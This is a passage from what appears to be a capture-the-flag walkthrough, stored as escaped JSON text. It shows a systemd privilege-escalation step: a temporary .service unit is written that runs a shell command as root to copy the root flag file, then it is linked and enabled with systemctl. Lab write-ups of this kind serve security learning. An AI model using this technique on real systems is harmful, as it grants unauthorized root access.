we just created.\nCopy and paste it in the shell but make sure to modify the command we need to run inorder to get the root flag.\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;cat root/root.txt \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF Now create symlink and enable it.\n/bin/systemctl link $TF /bin/systemctl enable --now $TF We got the root flag!!!\n"}]